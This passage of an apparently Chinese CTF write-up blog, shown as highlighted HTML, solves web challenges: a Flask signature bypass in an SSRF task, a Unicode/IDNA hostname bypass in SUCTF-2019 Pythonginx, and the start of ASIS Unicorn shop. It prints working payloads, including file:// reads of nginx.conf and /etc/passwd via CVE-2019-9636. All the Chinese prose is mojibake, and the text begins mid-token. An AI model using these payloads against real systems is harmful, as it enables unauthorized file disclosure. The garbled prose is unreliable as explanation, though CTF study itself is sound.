punctuation">.</span>sandbox<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">Exec</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>                       <span class="token comment">#å®šä¹‰çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œæ­¤å¤„è°ƒç”¨äº†scanè¿™ä¸ªè‡ªå®šä¹‰çš„å‡½æ•°</span>        result <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>checkSign<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token string">"scan"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span><span class="token comment">#actionè¦å†™scan</span>                tmpfile <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>                resp <span class="token operator">=</span> scan<span class="token punctuation">(</span>self<span class="token punctuation">.</span>param<span class="token punctuation">)</span>   <span class="token comment">#æ–‡ä»¶è¯»å–</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>resp <span class="token operator">==</span> <span class="token string">"Connection Timeout"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> resp                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span> resp            <span class="token comment">#è¾“å‡ºç»“æœ</span>                    tmpfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>resp<span class="token punctuation">)</span>                    tmpfile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span>            <span class="token keyword">if</span> <span class="token string">"read"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span><span class="token comment">#actionè¦åŠ read</span>                f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>                result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span>                result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>                result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Action Error"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span>            result<span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Sign Error"</span>        <span class="token keyword">return</span> result    <span class="token keyword">def</span> <span class="token function">checkSign</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>getSign<span class="token punctuation">(</span>self<span class="token punctuation">.</span>action<span class="token punctuation">,</span> self<span class="token punctuation">.</span>param<span class="token punctuation">)</span> <span class="token operator">==</span> self<span class="token punctuation">.</span>sign<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#!!!æ ¡éªŒ</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token comment">#generate Sign For Action Scan.</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/geneSign"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">#ç”¨äºæµ‹è¯•</span><span class="token keyword">def</span> <span class="token function">geneSign</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     action <span class="token operator">=</span> <span class="token string">"scan"</span>    <span class="token keyword">return</span> getSign<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/De1ta'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#å®é™…æ³¨å…¥</span><span class="token keyword">def</span> <span class="token function">challenge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    action <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"action"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sign <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"sign"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr   <span class="token comment">#è·å–ç”¨æˆ·ip</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>waf<span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"No Hacker!!!!"</span>    task <span class="token operator">=</span> Task<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">,</span> sign<span class="token punctuation">,</span> ip<span class="token punctuation">)</span>    <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>task<span class="token punctuation">.</span>Exec<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token comment">#æ ¹ç›®å½•è·¯ç”±</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"code.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">scan</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#è¿™æ˜¯ç”¨æ¥æ‰«ç›®å½•çš„å‡½æ•°</span>    socket<span class="token punctuation">.</span>setdefaulttimeout<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Connection Timeout"</span><span class="token keyword">def</span> <span class="token function">getSign</span><span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#MD5è®¡ç®—,æ­¤å¤„æ³¨æ„é¡ºåºå…ˆæ˜¯paramåæ˜¯action</span>    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>secert_key <span class="token operator">+</span> param <span class="token operator">+</span> action<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">md5</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#æ— ç”¨çš„waf</span>    check<span class="token operator">=</span>param<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> check<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"gopher"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> check<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span> <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">False</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span></code></pre><p>æ˜¯ä¸€ä¸ªåˆ©ç”¨flaskæ¡†æ¶æ­çš„ï¼Œæœ‰ä¸¤ä¸ªè·¯ç”±åˆ†åˆ«æ˜¯<code>geneSign</code>å’Œ<code>De1ta</code></p><p>é¦–å…ˆæ¥è¯»ä»£ç <code>geneSign</code>æ˜¯ç”¨æ¥è®¡ç®—ä¼ å…¥çš„<code>param</code>+scançš„md5å€¼ï¼Œåº”è¯¥æ˜¯ç”¨äºæµ‹è¯•çš„</p><p><code>De1ta</code>åˆ†åˆ«å¯ä¼ å…¥ä¸€ä¸ª<code>get</code>å‚æ•°<code>param</code>ï¼Œä¸¤ä¸ª<code>cookie</code>å‚æ•°<code>action</code>å’Œ<code>sign</code>ï¼Œå¹¶ä¸”<code>param</code>å‚æ•°å¥—äº†ä¸€å±‚<code>waf</code></p><p>éšåå»ºç«‹<code>Task</code>ç±»ä½¿ç”¨<code>Exec</code>æ–¹æ³•ï¼Œåœ¨çœ‹çœ‹<code>Task</code>ç±»æ˜¯ç”¨æ¥å¹²ä»€ä¹ˆçš„</p><p>é‡Œé¢å¯ä»¥<code>print</code>å‡º<code>scan</code>æ–¹æ³•å<code>param</code>çš„ç»“æœï¼Œæ ¹æ®é¢˜ç›®æç¤º<code>flag is in ./flag.txt</code>åº”è¯¥æ˜¯è®©æˆ‘ä»¬å»æƒ³åŠæ³•è¯»å–åˆ°flagæ–‡ä»¶ç„¶åè¾“å‡º</p><p>å†çœ‹åˆ°<code>Exec</code>æ–¹æ³•çš„ç¬¬ä¸€ä¸ªifï¼Œå¼•ç”¨äº†<code>checkSign</code>æ–¹æ³•ï¼Œè¿›è¡Œmd5å€¼çš„æ¯”è¾ƒï¼Œè¿™é‡Œæ˜¯è‚¯å®šè¦æƒ³åŠæ³•ç»•è¿‡çš„äº†ï¼Œé—®é¢˜æ˜¯æ€ä¹ˆç»•ï¼Ÿå¯ä»¥çœ‹åˆ°åé¢çš„ifè¯­å¥ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦è¯»åˆ°<code>flag</code>ï¼Œå°±éœ€è¦è®©<code>action</code>ä¸­æœ‰<code>read</code>å’Œ<code>scan</code></p><p>å†çœ‹åˆ°<code>geneSign</code>è·¯ç”±ï¼Œé‡Œé¢å›ºå®šæ­»äº†<code>action</code>çš„å€¼ä¸º<code>scan</code>ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ å…¥<code>param</code>çš„å€¼æ¥å¾—åˆ°md5å€¼</p><p>äºæ˜¯è®¾æƒ³ï¼Œå¦‚æœ<code>param</code>=<code>flag.txtread</code>ï¼Œé‚£ä¹ˆè®¡ç®—å‡ºæ¥çš„md5å€¼å°±æ˜¯<code>flag.txtreadscan</code>çš„md5å€¼ï¼Œæ³¨æ„<code>getSign</code>æ–¹æ³•è™½ç„¶å‚æ•°é¡ºåºä¸ä¸€æ ·ä½†æ˜¯åœ¨å‡½æ•°ä¸­å‚æ•°è¿˜æ˜¯è°ƒäº†å›æ¥ï¼Œæˆ‘ä»¬å°†å¾—åˆ°çš„md5èµ‹ç»™<code>sign</code>ï¼Œå†ä»¤<code>param</code>=<code>flag.txt</code>,<code>action</code>=<code>readscan</code>ï¼Œé‚£ä¹ˆ<code>checkSign</code>ä¸å°±å¯ä»¥è¿”å›<code>True</code>æˆåŠŸäº†æ¯”è¾ƒå—ï¼Œäºæ˜¯å¾—åˆ°payloadï¼š</p><pre class="language-none"><code class="language-none">param&#x3D;flag.txtaction&#x3D;readscan;sign&#x3D;8bdad5e249bb114a8874247817be9bad</code></pre><p>æŠ“åŒ…ä¼ å…¥å³å¯å¾—åˆ°flag</p><h1 id="ç¼–ç é—®é¢˜"><a href="#ç¼–ç é—®é¢˜" class="headerlink" title="ç¼–ç é—®é¢˜"></a>ç¼–ç é—®é¢˜</h1><h2 id="SUCTF-2019â€”Pythonginx"><a href="#SUCTF-2019â€”Pythonginx" class="headerlink" title="SUCTF-2019â€”Pythonginx"></a>SUCTF-2019â€”Pythonginx</h2><p>é¦–å…ˆçœ‹åˆ°é¢˜ç›®ç»™å‡ºçš„æºç ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/getUrl'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span>    host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"æˆ‘æ‰Œ your problem? 111"</span>    parts <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>urlsplit<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>    host <span class="token operator">=</span> parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"æˆ‘æ‰Œ your problem? 222 "</span> <span class="token operator">+</span> host    newhost <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> h <span class="token keyword">in</span> host<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        newhost<span class="token punctuation">.</span>append<span class="token punctuation">(</span>h<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'idna'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'.'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>newhost<span class="token punctuation">)</span>    <span class="token comment">#å»æ‰ url ä¸­çš„ç©ºæ ¼</span>    finalUrl <span class="token operator">=</span> urlunsplit<span class="token punctuation">(</span>parts<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>finalUrl<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>finalUrl<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"æˆ‘æ‰Œ your problem? 333"</span></code></pre><p>æˆ‘ä»¬å¯ä»¥ä¼ å…¥urlå‚æ•°ï¼Œè¦ç»•è¿‡å‰è¿ä¸¤æ¬¡<code>if</code>çš„åˆ¤æ–­ä¹Ÿå°±æ˜¯<code>host!=suctf.cc</code>ï¼Œåœ¨æœ€åä¸€æ¬¡è¦ç­‰äºï¼Œå°±å¯ä»¥è¿›è¡Œ<code>urlopen(finalUrl).read()</code>æ–‡ä»¶è¯»å–çš„æ“ä½œï¼Œæ¨æµ‹æ˜¯è¦æˆ‘ä»¬è¿›è¡Œæ–‡ä»¶è¯»å–</p><p><strong>Nginxä¸‹çš„é‡è¦æ–‡ä»¶ä½ç½®</strong></p><pre class="language-none"><code class="language-none">é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š&#x2F;etc&#x2F;nginxä¸»é…ç½®æ–‡ä»¶ï¼š&#x2F;etc&#x2F;nginx&#x2F;conf&#x2F;nginx.confç®¡ç†è„šæœ¬ï¼š&#x2F;usr&#x2F;lib64&#x2F;systemd&#x2F;system&#x2F;nginx.serviceæ¨¡å—ï¼š&#x2F;usr&#x2F;lisb64&#x2F;nginx&#x2F;modulesåº”ç”¨ç¨‹åºï¼š&#x2F;usr&#x2F;sbin&#x2F;nginxç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;htmlæ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š&#x2F;var&#x2F;log&#x2F;nginxé…ç½®æ–‡ä»¶ç›®å½•ä¸ºï¼š&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</code></pre><p>è¿™é‡Œå°±è¦æƒ³åŠæ³•å¦‚ä½•ç»•è¿‡å‰é¢çš„ä¸¤ä¸ªifï¼Œè€Œåœ¨ç¬¬ä¸‰ä¸ªifçš„æ—¶å€™åˆè¦åˆ¤æ–­é€šè¿‡ï¼Œå¯ä»¥çœ‹åˆ°åœ¨æœ€åä¸€ä¸ªifè¯­å¥çš„å‰é¢æœ‰è¿™æ ·çš„ä¸€ä¸ªæ“ä½œï¼š<code>newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</code>ï¼Œå…ˆå¯¹é‡Œé¢çš„å­—ç¬¦è¿›è¡Œäº†<code>idna</code>ç¼–ç ï¼Œéšåæœ‰è¿›è¡Œäº†<code>utf-8</code>è§£ç ï¼Œè¯¦æƒ…<a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf">å‚è€ƒ</a></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200428121257327.png" alt="image-20200428121257327" loading="lazy"></p><p>å¤§æ¦‚æ„æ€å°±æ˜¯é€šè¿‡è¿™æ ·çš„ç¼–ç å°±å¯ä»¥å¯¹ä¼ å…¥çš„æ•°æ®è¿›è¡Œç»•è¿‡</p><p>äºæ˜¯ç”¨è„šæœ¬è¿›è¡Œæµ‹è¯•</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urlparse<span class="token punctuation">,</span>urlunsplit<span class="token punctuation">,</span>urlsplit<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse<span class="token keyword">def</span> <span class="token function">get_unicode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">65536</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        uni<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>        url<span class="token operator">=</span><span class="token string">"http://suctf.c&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>uni<span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> getUrl<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"str: "</span><span class="token operator">+</span>uni<span class="token operator">+</span><span class="token string">' unicode: \\u'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span> <span class="token keyword">def</span> <span class="token function">getUrl</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    url<span class="token operator">=</span>url    host<span class="token operator">=</span>parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    parts<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span>urlsplit<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>    host<span class="token operator">=</span>parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    newhost<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> h <span class="token keyword">in</span> host<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        newhost<span class="token punctuation">.</span>append<span class="token punctuation">(</span>h<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'idna'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'.'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>newhost<span class="token punctuation">)</span>    finalUrl<span class="token operator">=</span>urlunsplit<span class="token punctuation">(</span>parts<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    host<span class="token operator">=</span>parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>finalUrl<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>  <span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    get_unicode<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>å¾—å‡ºå¦‚ä¸‹ç»“æœï¼š</p><pre class="language-none"><code class="language-none">str: â„‚ unicode: \u2102str: â…­ unicode: \u216dstr: â…½ unicode: \u217dstr: â’¸ unicode: \u24b8str: â“’ unicode: \u24d2str: ï¼£ unicode: \uff23str: ï½ƒ unicode: \uff43</code></pre><p>ä¼ å…¥è¯»å–æ–‡ä»¶å³å¯</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200428122756772.png" alt="image-20200428122756772" loading="lazy"></p><p>å¦å¤–è¿˜æœ‰ä¸€ç§ç”¨<code>â„†</code>å­—ç¬¦è¿›è¡Œçš„è¯»æ³•ï¼š</p><p><code>file://suctf.câ„†sr/local/nginx/conf/nginx.conf</code>==ç»è¿‡ç¼–ç ==&gt;<code>file://suctf.cc/usr/local/nginx/conf/nginx.conf</code>ï¼Œå°†cå’Œuéƒ½ç»™è¡¥å…¨äº†ï¼Œè¿™æ ·ä¹Ÿå¯ä»¥è¯»å–åˆ°æ–‡ä»¶å†…å®¹</p><p>å¦å¤–è¿™é‡Œè¿˜æœ‰ä¸ªéé¢„æœŸè§£åˆ©ç”¨çš„æ˜¯<code>CVE-2019-9636</code>ï¼Œåˆ©ç”¨çš„æ˜¯<code>urlsplitä¸å¤„ç†NFKCæ ‡å‡†åŒ–</code>ï¼Œpayloadï¼š<code>file:////suctf.cc/../../../../../etc/passwd</code>ï¼Œèµ„æ–™è¾ƒå°‘ï¼Œåˆ©ç”¨çš„ä¼¼ä¹æ˜¯é‚£å››ä¸ªæ–œæ </p><p><code>list(urllib.parse.urlsplit(&quot;file:////suctf.cc/../../../../../etc/passwd&quot;))</code>=<code>[&#39;file&#39;, &#39;&#39;, &#39;//suctf.cc/../../../../../etc/passwd&#39;, &#39;&#39;, &#39;&#39;]</code>ï¼Œè¿™æ ·ä¸€æ¥ç¬¬äºŒä¸ªå€¼å°±ä¸æ˜¯åŸæ¥çš„<code>hostname</code>è€Œæ˜¯ç©ºï¼Œå³å¯ç»•è¿‡å‰ä¸¤ä¸ªifåˆ¤æ–­ï¼Œæ¼æ´åˆ©ç”¨æ¡ä»¶ï¼š</p><pre class="language-none"><code class="language-none">Python Python &gt;&#x3D;2.7.xï¼Œ&lt;&#x3D;2.7.16Python Python &gt;&#x3D;3.xï¼Œ&lt;&#x3D;3.7.2</code></pre><h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p>ç•Œé¢ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200502184210541.png" alt loading="lazy"></p><p>å¯ä»¥çœ‹åˆ°åº”è¯¥æ˜¯å«æˆ‘ä»¬ä¹°ç‹¬è§’å…½ï¼Œè€Œä¸”è‚¯å®šæ˜¯è¦ä¹°æœ€è´µçš„é‚£ä¸ª</p><p>é¦–å…ˆè¾“å…¥<code>4</code>å’Œ<code>1337.0</code>æç¤º<code>Only one char(?) allowed!</code>åªèƒ½è¾“å…¥ä¸€ä¸ªå­—ç¬¦ï¼Œåœ¨è¯•ä¸€ä¸‹å‘ç°æŠ¥é”™é¡µé¢ä»£ç ï¼š</p><pre class="language-python" data-language="python"><code class="language-python">Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>  File <span class="token string">"/usr/local/lib/python2.7/site-packages/tornado/web.py"</span><span class="token punctuation">,</span> line <span class="token number">1541</span><span class="token punctuation">,</span> <span class="token keyword">in</span> _execute    result <span class="token operator">=</span> method<span class="token punctuation">(</span><span class="token operator">*</span>self<span class="token punctuation">.</span>path_args<span class="token punctuation">,</span> <span class="token operator">**</span>self<span class="token punctuation">.</span>path_kwargs<span 